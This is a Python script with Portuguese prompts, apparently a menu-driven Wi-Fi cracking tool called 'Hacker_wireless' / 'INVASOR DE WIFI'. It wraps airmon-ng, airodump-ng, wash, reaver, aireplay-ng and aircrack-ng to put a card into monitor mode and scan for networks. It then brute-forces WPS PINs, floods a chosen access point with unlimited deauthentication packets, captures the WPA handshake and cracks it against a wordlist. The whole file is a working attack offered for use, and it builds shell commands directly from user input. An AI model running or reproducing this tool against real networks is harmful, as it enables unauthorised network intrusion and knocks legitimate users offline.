#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import os

def Hacker_wireless():
    e = 'N'
    while e == 'N':
        os.system('\033[32m\033[1m')
        os.system('clear')
        os.system('figlet PLACAS DE RDS')
        os.system('airmon-ng')
        rede = input('''\033[0;0m$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
\033[34m\033[0;0m$$$$ \033[34mREDES PRA COLOCAR EM MODO MONITOR, COPIE E COLE LOGO A BAIXO\033[0;0m $$$$
\033[0;0m$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
\033[32m\033[1mDIGITE AQUI\033[34m:\033[0;0m ''')
        os.system('airmon-ng start {}'.format(rede))
        os.system('\033[32m\033[1m')
        os.system('clear')
        os.system('figlet SCANNER - RDS')
        os.system('airmon-ng')
        print('''¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨
OBSERVE QUE A INTERFACE DE REDE ACIMA MUDOU OK, SE SIM PROSSIGA COM SCANNER!
¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨''')
        rede2 = input('\n\033[34mCOPIE A PLACA DE REDE QUE ESTA EM MODO MONITOR E COLE AQUI\033[0;0m: ')
        at = int(input('''\033[0;0m \033[34mESCOLHA UMA DAS OPÇÕES ABAIXO PARA FAZER UM SCANNER NAS REDES\033[0;0m
(\033[32m\033[1m1\033[0;0m) Scanner com airodump-ng ataque brutforce!
(\033[32m\033[1m2\033[0;0m) Scanner com wash ataque wps!
\033[34mAGORA DIGITE UMA OPÇÃO DE SCANNER\033[0;0m: '''))
        if at == 1:
            print('##################### SCANEANDO REDES WIFI PROCIMAS, PARA PARAR ctrl + c ########################')
            os.system('airodump-ng {}'.format(rede2))
        else:
            os.system('wash -i {}'.format(rede2))
        cmd = ['xterm']
        w = 'airodump-ng'
        m = 'wlan0mon'
        print("@@@@@@@@@@@@@@@@@@@@@@@@@@ INVASOR DE WIFI @@@@@@@@@@@@@@@@@@@@@@@@@@@@\n")
        isc = 1
        if isc == 1:
            b = input('\033[34mDIGITE O BSSID\033[0;0m: ')
            c = input('\033[34mDIGITE O CANAL\033[0;0m: ')
        v1 = 'airodump-ng'
        v2 = '--write'
        v3 = 'rede'
        v4 = '--channel'
        v6 = '--bssid'
        v9 = '--ignore-negative-one'
        os.system('\033[32m\033[1m')
        os.system('clear')
        os.system('figlet ATAQUES - RDS')
        at = int(input('''\033[0;0m===============================================================================
==================== \033[36mESCOLHA UM ATAQUE DAS OPÇÕES ABAIXO\033[0;0m ======================
===============================================================================

(\033[32m\033[1m1\033[0;0m) Reaver pin wps!
(\033[32m\033[1m2\033[0;0m) Brutforce airncrak-ng!
\033[36m$$$$\033[0;0m DIGITE UMA OPÇÃO \033[36m$$$$\033[0;0m : '''))
        if at == 1:
            reiv = 'reaver -i'
            v0 = '-vv'
            c2 = '-c'
            b2 = '-b'
            cmd = ['xterm']
            cmd.extend(['-e', 'bash', '-c', '{} {} {} {} {} {} {}; exec $SHELL'.format(reiv, rede2, c2, c, b2, b, v0)])
            print('\033[33mQUANDO QUISER PARÁR, DA ctrl+c, E O ATAQUE IRA PARA DENTRO DA JANELA QUE ABRIU OK\033[0;0m')
            subprocess.Popen(cmd, stdout=subprocess.PIPE)
        else:
            print('''========================================================================================
===================================== CAPTURANDO O HANDSHAKE =============================
===========================================================================================\n''')
            cmd = ['xterm']
            cmd.extend(
                ['-e', 'bash', '-c',
                 '{} {} {} {} {} {} {} {} {}; exec $SHELL'.format(v1, v2, v3, v4, c, v6, b, rede2, v9)])
            subprocess.Popen(cmd, stdout=subprocess.PIPE)
            r = 'S'
            while r == 'S':
                os.system('\033[32m\033[1m')
                os.system('clear')
                os.system('figlet DESALTENTICAR')
                kw = int(input('''\033[0;0m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
(\033[32m\033[1m1\033[0;0m) Aireplay-ng desaltenticador de rede!
(\033[32m\033[1m2\033[0;0m) Se você ja capiturou o handshake!
\033[33m@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\033[0;0m
PARA CAPITURAR O HANDSHAKE MAIS RAPIDO, DIGITE 1 E DER ENTER, AGURDE 1 MINUTO
DEPOIS REPITA NOVAMENTE 1 OK DIGITE AQUI: '''))
                if kw == 1:
                    air = 'aireplay-ng'
                    dea = '--deauth 0 -a'
                    cmd = ['xterm']
                    cmd.extend(['-e', 'bash', '-c', '{} {} {} {}; exec $SHELL'.format(air, dea, b, rede2)])
                    subprocess.Popen(cmd, stdout=subprocess.PIPE)
                else:
                    wj = 'aircrack-ng'
                    w0 = '-w'
                    f1 = 'wordlist.txt'
                    r = input('\n\033[33mQuer Desaltenticar as Redes Novamente \033[34m[S\033[0;0m] ou [\033[34mN\033[0;0m] \n\033[33mSe você já capturou o handshake:\033[0;0m').upper()
                    t0 = '-='
                    print(t0*37)
                    os.system('ls')
                    ar = str(input('\033[33mDigite o nome do aquivo .cap: EX, \033[34mrede-01.cap\033[0;0m! Digite o nome correto:\033[0;0m '))
                    cmd = ['xterm']
                    cmd.extend(['-e', 'bash', '-c', '{} {} {} {} {}; exec $SHELL'.format(wj, ar, w0, f1, rede2)])
                    subprocess.Popen(cmd, stdout=subprocess.PIPE)
        e = input(('Deseja encerrar a sessão S para sim / e N para não encerra a seção: ')).upper()
    os.system('clesr')
    print('\n############################ FIM DA SEÇÃO ################################\n')
